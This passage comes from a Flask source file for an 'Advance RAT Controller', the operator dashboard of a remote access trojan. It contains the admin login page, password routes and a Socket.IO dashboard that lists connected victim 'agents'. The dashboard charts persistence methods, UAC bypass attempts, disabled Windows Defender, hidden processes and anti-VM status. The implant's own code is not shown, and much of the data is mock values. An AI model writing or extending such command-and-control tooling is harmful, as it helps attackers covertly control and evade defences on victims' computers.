                margin-bottom: 30px;
            }
            
            .login-header h1 {
                font-family: 'Orbitron', monospace;
                font-size: 2rem;
                font-weight: 900;
                background: linear-gradient(45deg, var(--accent-blue), var(--accent-purple));
                -webkit-background-clip: text;
                -webkit-text-fill-color: transparent;
                background-clip: text;
                margin-bottom: 10px;
            }
            
            .login-header p {
                color: var(--text-secondary);
                font-size: 0.9rem;
            }
            
            .form-group {
                margin-bottom: 20px;
            }
            
            .form-group label {
                display: block;
                margin-bottom: 8px;
                color: var(--text-secondary);
                font-weight: 500;
            }
            
            .form-group input {
                width: 100%;
                background: var(--secondary-bg);
                border: 1px solid var(--glass-border);
                border-radius: 8px;
                padding: 12px 16px;
                color: var(--text-primary);
                font-size: 1rem;
                transition: all 0.3s ease;
            }
            
            .form-group input:focus {
                outline: none;
                border-color: var(--accent-blue);
                box-shadow: 0 0 0 3px rgba(0, 212, 255, 0.1);
            }
            
            .login-btn {
                width: 100%;
                background: linear-gradient(45deg, var(--accent-blue), var(--accent-purple));
                border: none;
                border-radius: 8px;
                padding: 12px;
                color: white;
                font-weight: 600;
                font-size: 1rem;
                cursor: pointer;
                transition: all 0.3s ease;
            }
            
            .login-btn:hover {
                transform: translateY(-2px);
                box-shadow: 0 8px 25px rgba(0, 212, 255, 0.3);
            }
            
            .error-message {
                background: rgba(255, 71, 87, 0.2);
                color: #ff4757;
                border: 1px solid #ff4757;
                border-radius: 8px;
                padding: 12px;
                margin-bottom: 20px;
                text-align: center;
            }
        </style>
    </head>
    <body>
        <div class="login-container">
            <div class="login-header">
                <h1>Advance RAT Controller</h1>
                <p>Admin Authentication Required</p>
            </div>
            
            {% with messages = get_flashed_messages(with_categories=true) %}
                {% if messages %}
                    {% for category, message in messages %}
                        <div class="error-message">{{ message }}</div>
                    {% endfor %}
                {% endif %}
            {% endwith %}
            
            <form method="POST">
                <div class="form-group">
                    <label for="password">Admin Password</label>
                    <input type="password" id="password" name="password" required>
                </div>
                <button type="submit" class="login-btn">Access Dashboard</button>
            </form>
        </div>
    </body>
    </html>
    '''
    return render_template_string(login_template)

# Logout route
@app.route('/logout')
def logout():
    session.clear()
    return redirect(url_for('login'))

# Configuration status endpoint (for debugging)
@app.route('/config-status')
@require_auth
def config_status():
    """Display current configuration status (for debugging)"""
    return jsonify({
        'admin_password_set': bool(Config.ADMIN_PASSWORD),
        'admin_password_length': len(Config.ADMIN_PASSWORD),
        'secret_key_set': bool(Config.SECRET_KEY),
        'host': Config.HOST,
        'port': Config.PORT,
        'session_timeout': Config.SESSION_TIMEOUT,
        'max_login_attempts': Config.MAX_LOGIN_ATTEMPTS,
        'login_timeout': Config.LOGIN_TIMEOUT,
        'current_login_attempts': len(LOGIN_ATTEMPTS),
        'blocked_ips': [ip for ip, (attempts, _) in LOGIN_ATTEMPTS.items() if attempts >= Config.MAX_LOGIN_ATTEMPTS],
        'password_hash_algorithm': 'PBKDF2-SHA256',
        'hash_iterations': Config.HASH_ITERATIONS,
        'salt_length': Config.SALT_LENGTH
    })

# Password change endpoint
@app.route('/change-password', methods=['POST'])
@require_auth
def change_password():
    """Change the admin password"""
    global ADMIN_PASSWORD_HASH, ADMIN_PASSWORD_SALT
    
    try:
        data = request.get_json()
        current_password = data.get('current_password', '')
        new_password = data.get('new_password', '')
        
        # Verify current password
        if not verify_password(current_password, ADMIN_PASSWORD_HASH, ADMIN_PASSWORD_SALT):
            return jsonify({'success': False, 'message': 'Current password is incorrect'}), 400
        
        # Validate new password
        if len(new_password) < 8:
            return jsonify({'success': False, 'message': 'New password must be at least 8 characters long'}), 400
        
        # Generate new hash for the new password
        new_hash, new_salt = create_secure_password_hash(new_password)
        ADMIN_PASSWORD_HASH = new_hash
        ADMIN_PASSWORD_SALT = new_salt
        
        # Update the config (this will persist for the current session)
        Config.ADMIN_PASSWORD = new_password
        
        return jsonify({'success': True, 'message': 'Password changed successfully'}), 200
        
    except Exception as e:
        return jsonify({'success': False, 'message': f'Error changing password: {str(e)}'}), 500

# --- Web Dashboard HTML (with Socket.IO) ---
DASHBOARD_HTML = r'''
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8" />
<meta name="viewport" content="width=device-width,initial-scale=1" />
<title>Advance RAT Controller — Enhanced Security Dashboard</title>

<!-- Fonts & libs -->
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700&family=Orbitron:wght@600;900&display=swap" rel="stylesheet">
<script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.7.2/socket.io.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/chart.js@4.4.0/dist/chart.umd.min.js"></script>

<style>
  :root{
    --bg-1:#f6f8fa;         /* light background */
    --bg-2:#e9eef3;         /* secondary light */
    --glass: rgba(255,255,255,0.7);
    --glass-2: rgba(255,255,255,0.9);
    --accent-a:#0070c0;
    --accent-b:#00bfae;
    --muted:#6b7a90;
    --card-border: rgba(0,0,0,0.06);
    --card-shadow: 0 2px 12px rgba(0,0,0,0.07);
    --header-bg: #fff;
    --header-shadow: 0 2px 8px rgba(0,0,0,0.04);
  }
  *{box-sizing:border-box}
  html,body{height:100%;margin:0;font-family:"Inter",system-ui,-apple-system,Segoe UI,roboto,"Helvetica Neue",Arial;}
  body{
    background: linear-gradient(180deg,var(--bg-1),var(--bg-2));
    color:#222;
    -webkit-font-smoothing:antialiased;
    overflow:hidden;
  }

  /* Top navbar redesign */
  .top-nav{
    height:72px;
    display:flex;
    align-items:center;
    justify-content:space-between;
    padding:0 32px;
    gap:16px;
    border-bottom:1px solid var(--card-border);
    background: var(--header-bg);
    box-shadow: var(--header-shadow);
    position:relative;
    z-index:10;
  }
  .brand{
    display:flex;
    align-items:center;
    gap:18px;
  }
  .brand .logo{
    height:48px;width:48px;border-radius:12px;
    background:linear-gradient(135deg,var(--accent-a),var(--accent-b));
    display:flex;align-items:center;justify-content:center;font-weight:800;font-family:Orbitron;
    color:#fff; box-shadow:0 4px 16px rgba(0,0,0,0.10);
    font-size:1.5rem;
  }
  .brand h1{font-size:1.25rem;margin:0;color:#0070c0;font-weight:800;letter-spacing:0.01em;}
  .nav-tabs{display:flex;gap:18px;margin-left:32px}
  .nav-tab{
    color:var(--muted); padding:12px 18px; border-radius:10px; font-weight:700; font-size:1rem;
    cursor:pointer; transition:all .15s ease; background:transparent;
  }
  .nav-tab.active{
    color:var(--accent-a); background:rgba(0,112,192,0.08);
    border:1px solid var(--accent-a);
    box-shadow:0 2px 8px rgba(0,112,192,0.08);
  }
  
  /* Dropdown styles */
  .dropdown-wrapper{position:relative;display:inline-block}
  .nav-tab-btn{
    color:var(--muted); padding:10px 12px; border-radius:8px; font-weight:600; font-size:0.9rem;
    cursor:pointer; transition:all .15s ease; background:transparent; border:none;
  }
  .nav-tab-btn:hover{
    color:white; background:linear-gradient(90deg, rgba(0,212,255,0.06), rgba(124,92,255,0.05));
    border:1px solid rgba(255,255,255,0.03);
  }
  .dropdown-menu{
    position:absolute; top:100%; left:0; min-width:200px; z-index:1000;
    background:linear-gradient(180deg, rgba(15,23,36,0.98), rgba(7,7,9,0.98));
    border:1px solid rgba(255,255,255,0.08); border-radius:12px; padding:8px;
    box-shadow:0 20px 40px rgba(0,0,0,0.6); backdrop-filter:blur(12px);
    opacity:0; visibility:hidden; transform:translateY(-10px);
    transition:all 0.2s ease;
  }
  .dropdown-menu.show{opacity:1; visibility:visible; transform:translateY(0)}
  .dropdown-item{
    padding:12px 16px; border-radius:8px; cursor:pointer; font-weight:500;
    color:var(--muted); transition:all 0.15s ease; margin:2px 0;
  }
  .dropdown-item:hover{
    color:white; background:linear-gradient(90deg, rgba(0,212,255,0.08), rgba(124,92,255,0.06));
  }

  .top-actions{display:flex;align-items:center;gap:12px}
  .top-actions .btn{
    background:transparent;color:var(--muted);border:1px solid rgba(255,255,255,0.03);padding:8px 12px;border-radius:8px;font-weight:600;
  }
  .top-actions .logout{background:linear-gradient(90deg,var(--accent-a),var(--accent-b));padding:9px 14px;border-radius:8px}

  /* Page layout */
  .page{
    display:grid;
    grid-template-columns: 320px 1fr 360px;
    grid-template-rows: auto 1fr;
    gap:16px;
    height: calc(100vh - 68px);
    padding:18px;
  }

  /* Filters row spanning center+right */
  .filters{
    grid-column: 1 / span 3;
    display:flex;gap:12px;align-items:center;padding:12px;border-radius:12px;background:var(--glass-2);
    border:1px solid var(--card-border); margin-bottom:0;
  }
  .filters .filter{padding:10px 12px;border-radius:8px;background:rgba(255,255,255,0.02);border:1px solid rgba(255,255,255,0.02);color:var(--muted);font-weight:600}
  .filters .filter.select{min-width:180px}
  .filters .spacer{flex:1}

  /* Left sidebar */
  .sidebar{
    background:linear-gradient(180deg, rgba(255,255,255,0.02), rgba(255,255,255,0.01));
    border-radius:12px;padding:16px;border:1px solid var(--card-border);overflow:auto;
  }
  .sidebar h3{margin:0 0 12px 0;font-size:0.95rem;color:#fff}
  .agent-list{display:flex;flex-direction:column;gap:10px}
  .agent-item{
    display:flex;align-items:center;justify-content:space-between;padding:12px;border-radius:10px;background:rgba(255,255,255,0.01);
    border:1px solid rgba(255,255,255,0.02); cursor:pointer;
  }
  .agent-item .meta{display:flex;gap:10px;align-items:center}
  .agent-bullet{width:12px;height:12px;border-radius:50%}
  .bullet-online{background:#0ee6a6;box-shadow:0 0 8px rgba(14,230,166,0.12)}
  .bullet-off{background:#ff5c7c}
  .agent-name{font-weight:700;color:#eaf7ff}
  .agent-sub{font-size:0.8rem;color:var(--muted)}

  .controls{margin-top:14px;display:flex;flex-direction:column;gap:10px}
  .control-btn{padding:10px;border-radius:8px;background:transparent;border:1px solid rgba(255,255,255,0.03);color:var(--muted);font-weight:700;cursor:pointer}
  .control-btn.primary{background:linear-gradient(90deg,var(--accent-a),var(--accent-b));color:#02111a;border:none}

  /* Center area */
  .center{
    display:flex;flex-direction:column;gap:14px;padding:6px;overflow:hidden;
  }
  .card{
    border-radius:12px;padding:18px;background:linear-gradient(180deg, rgba(255,255,255,0.02), rgba(255,255,255,0.01));
    border:1px solid var(--card-border);
  }

  .summary-row{display:grid;grid-template-columns: repeat(3,1fr);gap:14px}
  .summary-card{display:flex;gap:18px;align-items:center;min-width:0;flex:1 1 0;}
  .summary-card .chart-wrap{width:110px;height:110px;display:flex;align-items:center;justify-content:center;min-width:110px;}
  .summary-card .info{flex:1;min-width:0;overflow:visible;}
  .metric-big{font-size:1.55rem;font-weight:800;color:#fff;white-space:nowrap;overflow:visible;text-overflow:unset;}
  .metric-sub{color:var(--muted);font-size:0.95rem;margin-top:6px;white-space:normal;overflow:visible;text-overflow:unset;}

  .trend{
    margin-top:6px;height:320px;
  }

  /* Right column */
  .rightcol{display:flex;flex-direction:column;gap:14px;padding:0 6px;overflow:auto}
  .metric-grid{display:grid;grid-template-columns:1fr 1fr;gap:10px}
  .metric-pill{padding:12px;border-radius:10px;background:rgba(255,255,255,0.01);border:1px solid var(--card-border);text-align:center}
  .metric-pill .v{font-weight:800;font-size:1.3rem;color:#fff}
  .terminal{height:260px;padding:12px;border-radius:10px;background:#071226;border:1px solid rgba(255,255,255,0.02);overflow:auto;font-family:monospace;color:#8ef0c5}

  /* System Overview sections */
  .system-overview{display:grid;grid-template-columns:1fr 1fr;gap:16px;margin-top:10px}
  .overview-section{padding:18px;border-radius:10px;background:rgba(255,255,255,0.02);border:1px solid rgba(255,255,255,0.05);min-width:0;}
  .overview-section h4{margin:0 0 12px 0;color:#fff;font-size:1.1rem;font-weight:600}
  .info-display{display:flex;flex-direction:column;gap:10px}
  .info-item{display:flex;justify-content:space-between;align-items:center;padding:6px 0;min-width:0;}
  .info-item .label{color:var(--muted);font-size:1rem;white-space:nowrap;}
  .info-item span:last-child{color:#fff;font-weight:500;text-align:right;max-width:60%;overflow-wrap:break-word;word-break:break-all;white-space:normal;}

  /* Small helpers */
  .muted{color:var(--muted)}
  .small{font-size:0.85rem}
  .kpi{display:flex;gap:8px;align-items:center}
  .kpi .dot{width:10px;height:10px;border-radius:50%}
  .dot-blue{background:var(--accent-a)}
  .dot-purple{background:var(--accent-b)}

  /* responsive */
  @media (max-width:1100px){
    .page{grid-template-columns: 1fr; grid-auto-rows: auto; height:calc(100vh - 68px); overflow:auto}
    .filters{grid-column:1}
    .summary-row{grid-template-columns:1fr;}
    .system-overview{grid-template-columns:1fr;}
    .card{padding:12px;}
    .summary-card .chart-wrap{width:90px;height:90px;min-width:90px;}
    .metric-big{font-size:1.1rem;}
    .metric-sub{font-size:0.85rem;}
  }
</style>
</head>
<body>

  <div class="top-nav">
    <div class="brand">
      <div class="logo">N</div>
      <div style="display:flex;flex-direction:column;line-height:1">
        <h1>Advance Rat Controller</h1>
        <div class="muted small">Agent Live Monitoring</div>
      </div>

      <div class="nav-tabs" style="margin-left:22px">
        <div class="nav-tab active" onclick="showOverview()">Overview</div>
        <div class="nav-tab dropdown-wrapper">
          <div class="nav-tab-btn" onclick="toggleDropdown('category-dropdown')">Category</div>
          <div class="dropdown-menu" id="category-dropdown">
            <div class="dropdown-item" onclick="showCategory('auth-security')">Authentication & Security</div>
            <div class="dropdown-item" onclick="showCategory('streaming-comm')">Streaming & Communication</div>
          </div>
        </div>
        <div class="nav-tab dropdown-wrapper">
          <div class="nav-tab-btn" onclick="toggleDropdown('checks-dropdown')">Checks</div>
          <div class="dropdown-menu" id="checks-dropdown">
            <div class="dropdown-item" onclick="showChecks('agent-system')">Agent & System Health</div>
            <div class="dropdown-item" onclick="showChecks('webrtc-streaming')">WebRTC Streaming</div>
            <div class="dropdown-item" onclick="showChecks('controller-server')">Controller & Server</div>
          </div>
        </div>
        <div class="nav-tab dropdown-wrapper">
          <div class="nav-tab-btn" onclick="toggleDropdown('time-dropdown')">Time Range</div>
          <div class="dropdown-menu" id="time-dropdown">
            <div class="dropdown-item" onclick="showTimeRange('last-hour')">Last Hour</div>
            <div class="dropdown-item" onclick="showTimeRange('last-24h')">Last 24 Hours</div>
            <div class="dropdown-item" onclick="showTimeRange('last-7d')">Last 7 Days</div>
            <div class="dropdown-item" onclick="showTimeRange('custom')">Custom Range</div>
          </div>
        </div>
      </div>
    </div>

    <div class="top-actions">
      <div class="small muted">Agent: <strong style="color:white">45t8ZVUro7QhXlClAAAB</strong></div>
      <a href="/logout" class="logout">Logout</a>
    </div>
  </div>

  <div class="page">

    <!-- FILTERS -->
    <div class="filters">
      <div class="filter select">Device Group: <strong style="margin-left:8px;color:white">Online</strong></div>
      <div class="filter select">Category: <strong style="margin-left:8px;color:white">Security</strong></div>
      <div class="filter">Checks: <strong style="margin-left:8px;color:white">Failed</strong></div>
      <div class="filter">Time Range: <strong style="margin-left:8px;color:white">current</strong></div>
      <div class="spacer"></div>
      <div class="filter small">Export</div>
      <div class="filter small">Refresh</div>
    </div>

    <!-- LEFT -->
    <div class="sidebar card">
      <h3>Active Agents</h3>
      <div class="agent-list" id="agent-list">
        <!-- JS will populate -->
        <div style="text-align:center;padding:26px;color:var(--muted);border-radius:10px;border:1px dashed rgba(255,255,255,0.02)">
          No agents connected
        </div>
      </div>

      <div class="controls">
        <button class="control-btn primary" onclick="getSystemInfo()">Agent Stats</button>
        <button class="control-btn" onclick="getNetworkInfo()">System Health</button>
        <button class="control-btn" onclick="listProcesses()">List Processes</button>
        <button class="control-btn" onclick="refreshOverview()">Refresh Dashboard</button>
      </div>
    </div>

    <!-- CENTER -->
    <div class="center">
      <!-- Summary row -->
      <div class="card summary-row">
        <div class="summary-card">
          <div class="chart-wrap">
            <canvas id="doughnut1" width="100" height="100"></canvas>
          </div>
          <div class="info">
            <div class="metric-big" id="metric1">23</div>
            <div class="metric-sub">Agent Report Status</div>
            <div class="small muted">Realtime problems, errors, and bugs</div>
          </div>
        </div>

        <div class="summary-card">
          <div class="chart-wrap">
            <canvas id="doughnut2" width="100" height="100"></canvas>
          </div>
          <div class="info">
            <div class="metric-big" id="metric2">8</div>
            <div class="metric-sub">Agent Connection Status</div>
            <div class="small muted">Connected vs offline agents</div>
          </div>
        </div>

        <div class="summary-card">
          <div class="chart-wrap">
            <canvas id="doughnut3" width="100" height="100"></canvas>
          </div>
          <div class="info">
            <div class="metric-big" id="metric3">41%</div>
            <div class="metric-sub">Bypass Status</div>
            <div class="small muted">Persistence & UAC bypass methods</div>
          </div>
        </div>
      </div>

      <!-- Controller Status Chart -->
      <div class="card">
        <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:16px">
          <div style="font-weight:700">Controller Status</div>
          <div class="muted small">Realtime metrics</div>
        </div>
        <div style="display:grid;grid-template-columns:320px 1fr;gap:20px;align-items:center">
          <div class="summary-card">
            <div class="chart-wrap">
              <canvas id="controllerDoughnut" width="100" height="100"></canvas>
            </div>
            <div class="info">
              <div class="metric-big" id="controllerMetric">92%</div>
              <div class="metric-sub">System Health</div>
              <div class="small muted">Latency, agents, service</div>
            </div>
          </div>
          <div class="trend">
            <canvas id="trendChart" width="600" height="240"></canvas>
          </div>
        </div>
      </div>

      <!-- System Overview with Dashboard Metrics -->
      <div style="display:flex;gap:12px">
        <div class="card" style="flex:1">
          <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:8px">
            <div style="font-weight:700">System Overview</div>
            <div class="muted small">Real-time monitoring</div>
          </div>
          <div class="system-overview">
            <div class="overview-section">
              <h4>Agent Statistics</h4>
              <div id="agent-stats-display" class="info-display">
                <div class="info-item"><span class="label">Agent Reports:</span> <span id="agent-reports">39</span></div>
                <div class="info-item"><span class="label">Agents Status:</span> <span id="agents-status">26</span></div>
                <div class="info-item"><span class="label">Overall Pass Rate:</span> <span id="pass-rate">57%</span></div>
                <div class="info-item"><span class="label">Trend:</span> <span id="trend-info">vs previous period</span></div>
              </div>
            </div>
            <div class="overview-section">
              <h4>System Health</h4>
              <div id="system-health-display" class="info-display">
                <div class="info-item"><span class="label">Controller Status:</span> <span id="controller-status">Active</span></div>
                <div class="info-item"><span class="label">Monitoring Period:</span> <span id="monitoring-period">Last 30 days</span></div>
                <div class="info-item"><span class="label">System Uptime:</span> <span id="system-uptime">Loading...</span></div>
                <div class="info-item"><span class="label">Last Update:</span> <span id="last-update">Just now</span></div>
              </div>
            </div>
          </div>
        </div>

        <div class="card" style="width:340px">
          <div style="display:flex;justify-content:space-between;align-items:center">
            <div style="font-weight:700">Quick Metrics</div>
            <div class="muted small">Real-time</div>
          </div>

          <div class="metric-grid" style="margin-top:12px">
            <div class="metric-pill"><div class="v" id="m1">12</div><div class="small muted">Active Agents</div></div>
            <div class="metric-pill"><div class="v" id="m2">5</div><div class="small muted">Online Systems</div></div>
            <div class="metric-pill"><div class="v" id="m3">98%</div><div class="small muted">System Health</div></div>
            <div class="metric-pill"><div class="v" id="m4">45ms</div><div class="small muted">Response Time</div></div>
          </div>

          <div style="margin-top:12px;font-weight:700">Output</div>
          <div class="terminal" id="output-terminal">NEURAL_TERMINAL_v2.1 &gt; Waiting for events...</div>
        </div>
      </div>
      
      <!-- Dynamic Content Area (hidden by default, shown when category/checks/time-range selected) -->
      <div class="card" id="dynamic-content" style="display:none;">
        <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:16px">
          <div style="font-weight:700" id="dynamic-title">Dynamic Content</div>
          <button onclick="hideDynamicContent()" style="background:transparent;border:1px solid rgba(255,255,255,0.1);color:var(--muted);padding:6px 12px;border-radius:6px;cursor:pointer">× Close</button>
        </div>
        <div style="display:grid;grid-template-columns:1fr 1fr;gap:20px;">
          <div>
            <div class="chart-wrap" style="height:300px;display:flex;align-items:center;justify-content:center">
              <canvas id="dynamicDoughnut" width="300" height="300"></canvas>
            </div>
          </div>
          <div>
            <div style="height:300px;">
              <canvas id="dynamicLineChart" width="400" height="300"></canvas>
            </div>
          </div>
        </div>
        <div id="dynamic-details" style="margin-top:20px;padding:16px;background:rgba(255,255,255,0.02);border-radius:8px">
          <div class="small muted">Detailed information will appear here...</div>
        </div>
      </div>
    </div>

    <!-- RIGHT -->
    <div class="rightcol">
      <div class="card">
        <div style="display:flex;justify-content:space-between;align-items:center">
          <div style="font-weight:700">Config Status</div>
          <div class="muted small">Last updated: <span id="cfg-time">—</span></div>
        </div>
        <div style="margin-top:12px;display:grid;gap:8px">
          <div style="display:flex;justify-content:space-between"><div class="muted">Admin password set</div><div id="cfg1">Yes</div></div>
          <div style="display:flex;justify-content:space-between"><div class="muted">Secret key</div><div id="cfg2">Hidden</div></div>
          <div style="display:flex;justify-content:space-between"><div class="muted">Session timeout</div><div id="cfg3">3600s</div></div>
          <div style="display:flex;justify-content:space-between"><div class="muted">Blocked IPs</div><div id="cfg4">0</div></div>
        </div>
      </div>

      <div class="card">
        <div style="font-weight:700;margin-bottom:8px">Password Management</div>
        <div style="display:flex;flex-direction:column;gap:8px">
          <input id="new-pass" placeholder="New password" style="padding:10px;border-radius:8px;background:transparent;border:1px solid rgba(255,255,255,0.03);color:#fff">
          <button class="control-btn primary" onclick="changePassword()">Change Password</button>
          <div class="small muted">Make sure you are connected via secure channel.</div>
        </div>
      </div>
    </div>

  </div>

<script>
  /* --------- Socket.IO hook (existing server) --------- */
  const socket = io();
  
  // Global chart references
  let d1, d2, d3, controllerChart, trendChart, dynamicDoughnutChart, dynamicLineChart;
  
  // Current dashboard state
  let currentView = 'overview';

  // Example socket events wiring - adapt to your server event names
  socket.on('connect', ()=> {
    appendLog('Socket connected: ' + socket.id);
    updateMetric('m1', '---');
    initializeCharts();
  });

  socket.on('agent_list', data => {
    renderAgentList(data);
  });

  socket.on('terminal_output', data => {
    appendLog(data);
  });

  socket.on('config_status', data => {
    document.getElementById('cfg-time').innerText = new Date().toLocaleTimeString();
    document.getElementById('cfg1').innerText = data.admin_password_set ? 'Yes':'No';
    document.getElementById('cfg3').innerText = data.session_timeout + 's';
    document.getElementById('cfg4').innerText = data.blocked_ips.length;
  });

  /* --------- Render helpers --------- */
  function appendLog(msg){
    const el = document.getElementById('output-terminal');
    el.innerText = (new Date().toLocaleTimeString()) + ' > ' + msg + '\n' + el.innerText;
  }
  function renderAgentList(list){
    const container = document.getElementById('agent-list');
    container.innerHTML = '';
    if(!list || list.length===0){
      container.innerHTML = '<div style="text-align:center;padding:26px;color:var(--muted);border-radius:10px;border:1px dashed rgba(255,255,255,0.02)">No agents connected</div>';
      return;
    }
    list.forEach(a=>{
      const item = document.createElement('div');
      item.className='agent-item';
      item.innerHTML = `<div class="meta"><div style="display:flex;flex-direction:column"><div class="agent-name">${a.name || a.id}</div><div class="agent-sub">${a.os||'unknown'}</div></div></div><div style="display:flex;align-items:center;gap:8px"><div class="agent-bullet ${a.online?'bullet-online':'bullet-off'}"></div><div class="muted small">${a.id}</div></div>`;
      item.onclick = ()=>{ selectAgent(a.id); };
      container.appendChild(item);
    });
  }
  function selectAgent(id){ 
    // Store selected agent ID for potential future use
    window.selectedAgentId = id;
    appendLog('Selected agent '+id); 
  }

  /* --------- Chart initialization --------- */
  function initializeCharts() {
    const doughnutOpts = {responsive:true, maintainAspectRatio:false, cutout:'70%', plugins:{legend:{display:false}}};

    // Overview Charts
    d1 = new Chart(document.getElementById('doughnut1').getContext('2d'),{
      type:'doughnut',
      data:{
        labels:['Problems','Errors','Bugs'], 
        datasets:[{
          data:[15,8,5], 
          backgroundColor:[getColor('--accent-a'), getColor('--accent-b'),'rgba(255,92,124,0.8)'], 
          borderWidth:0
        }]
      },
      options:doughnutOpts
    });
    
    d2 = new Chart(document.getElementById('doughnut2').getContext('2d'),{
      type:'doughnut',
      data:{
        labels:['Connected','Recently Active','Offline'], 
        datasets:[{
          data:[12,6,4], 
          backgroundColor:[getColor('--accent-a'),getColor('--accent-b'),'rgba(255,255,255,0.06)'], 
          borderWidth:0
        }]
      },
      options:doughnutOpts
    });
    
    d3 = new Chart(document.getElementById('doughnut3').getContext('2d'),{
      type:'doughnut',
      data:{
        labels:['Registry Keys','Startup Entries','Scheduled Tasks','UAC Bypass'], 
        datasets:[{
          data:[8,5,3,6], 
          backgroundColor:[getColor('--accent-a'),getColor('--accent-b'),'#7ee3b6','#ff9f43'], 
          borderWidth:0
        }]
      },
      options:doughnutOpts
    });

    // Controller Status Chart
    controllerChart = new Chart(document.getElementById('controllerDoughnut').getContext('2d'),{
      type:'doughnut',
      data:{
        labels:['Latency Good','Agents Active','Service Health'], 
        datasets:[{
          data:[92,87,95], 
          backgroundColor:[getColor('--accent-a'),getColor('--accent-b'),'#7ee3b6'], 
          borderWidth:0
        }]
      },
      options:doughnutOpts
    });
  }

    // Trend Chart
    const trendCtx = document.getElementById('trendChart').getContext('2d');
    trendChart = new Chart(trendCtx, {
      type: 'line',
      data: {
        labels: Array.from({length:24}, (_,i)=> (i < 10 ? '0' : '') + i + ':00'),
        datasets: [
          {
            label:'Latency (ms)', 
            data: randomSeries(24,45,120), 
            borderColor:getColor('--accent-a'), 
            tension:0.28, 
            pointRadius:2, 
            fill:false
          },
          {
            label:'Active Agents', 
            data: randomSeries(24,8,25), 
            borderColor:getColor('--accent-b'), 
            tension:0.28, 
            pointRadius:2, 
            fill:false
          },
          {
            label:'Service Health %', 
            data: randomSeries(24,85,100), 
            borderColor:'#7ee3b6', 
            tension:0.28, 
            pointRadius:2, 
            fill:false
          }
        ]
      },
      options:{
        responsive:true, 
        maintainAspectRatio:false,
        plugins:{
          legend:{
            labels:{color:'#cfeaff'}
          }
        },
        scales:{
          x:{
            grid:{display:false}, 
            ticks:{color:'#9fb8d8'}
          },
          y:{
            grid:{color:'rgba(255,255,255,0.03)'}, 
            ticks:{color:'#9fb8d8'}
          }
        }
      }
    });

  function randomSeries(n,min,max){ return Array.from({length:n}, ()=> Math.round(Math.random()*(max-min)+min)); }
  function getColor(varName){
    // read value from CSS variable
    return getComputedStyle(document.documentElement).getPropertyValue(varName) || '#00d4ff';
  }

  /* --------- Navigation Functions --------- */
  function showOverview() {
    currentView = 'overview';
    setActiveTab('Overview');
    hideDynamicContent();
    appendLog('Switched to Overview');
  }

  function toggleDropdown(dropdownId) {
    // Close all other dropdowns
    document.querySelectorAll('.dropdown-menu').forEach(menu => {
      if(menu.id !== dropdownId) {
        menu.classList.remove('show');
      }
    });
    
    // Toggle current dropdown
    const dropdown = document.getElementById(dropdownId);
    dropdown.classList.toggle('show');
  }

  function showCategory(category) {
    currentView = 'category';
    setActiveTab('Category');
    toggleDropdown('category-dropdown'); // Close dropdown
    
    const categoryData = getCategoryData(category);
    showDynamicContent(categoryData.title, categoryData.doughnutData, categoryData.lineData, categoryData.details);
    appendLog(`Viewing category: ${categoryData.title}`);
  }

  function showChecks(checkType) {
    currentView = 'checks';
    setActiveTab('Checks');
    toggleDropdown('checks-dropdown'); // Close dropdown
    
    const checksData = getChecksData(checkType);
    showDynamicContent(checksData.title, checksData.doughnutData, checksData.lineData, checksData.details);
    appendLog(`Viewing checks: ${checksData.title}`);
  }

  function showTimeRange(range) {
    currentView = 'timerange';
    setActiveTab('Time Range');
    toggleDropdown('time-dropdown'); // Close dropdown
    
    const timeData = getTimeRangeData(range);
    showDynamicContent(timeData.title, timeData.doughnutData, timeData.lineData, timeData.details);
    appendLog(`Viewing time range: ${timeData.title}`);
  }

  function setActiveTab(tabName) {
    document.querySelectorAll('.nav-tab').forEach(tab => {
      tab.classList.remove('active');
    });
    document.querySelectorAll('.nav-tab-btn').forEach(btn => {
      btn.parentElement.classList.remove('active');
    });
    
    if(tabName === 'Overview') {
      document.querySelector('.nav-tab[onclick="showOverview()"]').classList.add('active');
    }
  }

  function showDynamicContent(title, doughnutData, lineData, details) {
    document.getElementById('dynamic-title').innerText = title;
    document.getElementById('dynamic-content').style.display = 'block';
    document.getElementById('dynamic-details').innerHTML = details;
    
    // Create or update dynamic charts
    updateDynamicCharts(doughnutData, lineData);
  }

  function hideDynamicContent() {
    document.getElementById('dynamic-content').style.display = 'none';
    setActiveTab('Overview');
  }

  function updateDynamicCharts(doughnutData, lineData) {
    const doughnutOpts = {responsive:true, maintainAspectRatio:false, cutout:'60%', plugins:{legend:{display:true, position:'bottom', labels:{color:'#cfeaff'}}}};
    
    // Destroy existing charts if they exist
    if(dynamicDoughnutChart) {
      dynamicDoughnutChart.destroy();
    }
    if(dynamicLineChart) {
      dynamicLineChart.destroy();
    }
    
    // Create new doughnut chart
    dynamicDoughnutChart = new Chart(document.getElementById('dynamicDoughnut').getContext('2d'), {
      type: 'doughnut',
      data: doughnutData,
      options: doughnutOpts
    });
    
    // Create new line chart
    dynamicLineChart = new Chart(document.getElementById('dynamicLineChart').getContext('2d'), {
      type: 'line',
      data: lineData,
      options: {
        responsive: true,
        maintainAspectRatio: false,
        plugins: {
          legend: {
            labels: {color: '#cfeaff'}
          }
        },
        scales: {
          x: {
            grid: {display: false},
            ticks: {color: '#9fb8d8'}
          },
          y: {
            grid: {color: 'rgba(255,255,255,0.03)'},
            ticks: {color: '#9fb8d8'}
          }
        }
      }
    });
  }

  /* --------- Data Functions --------- */
  function getCategoryData(category) {
    const categoryMap = {
      'auth-security': {
        title: 'Authentication & Security',
        doughnutData: {
          labels: ['Admin Passwords Set', 'Session Active', 'Security Evasion', 'Windows Defender Disabled', 'Processes Hidden', 'Anti-VM Active'],
          datasets: [{
            data: [95, 87, 78, 65, 45, 32],
            backgroundColor: [getColor('--accent-a'), getColor('--accent-b'), '#7ee3b6', '#ff9f43', '#e74c3c', '#9b59b6'],
            borderWidth: 0
          }]
        },
        lineData: {
          labels: Array.from({length: 24}, (_, i) => (i < 10 ? '0' : '') + i + ':00'),
          datasets: [
            {
              label: 'Security Events',
              data: randomSeries(24, 5, 45),
              borderColor: getColor('--accent-a'),
              tension: 0.28,
              pointRadius: 2,
              fill: false
            },
            {
              label: 'UAC Bypass Attempts',
              data: randomSeries(24, 2, 15),
              borderColor: getColor('--accent-b'),
              tension: 0.28,
              pointRadius: 2,
              fill: false
            }
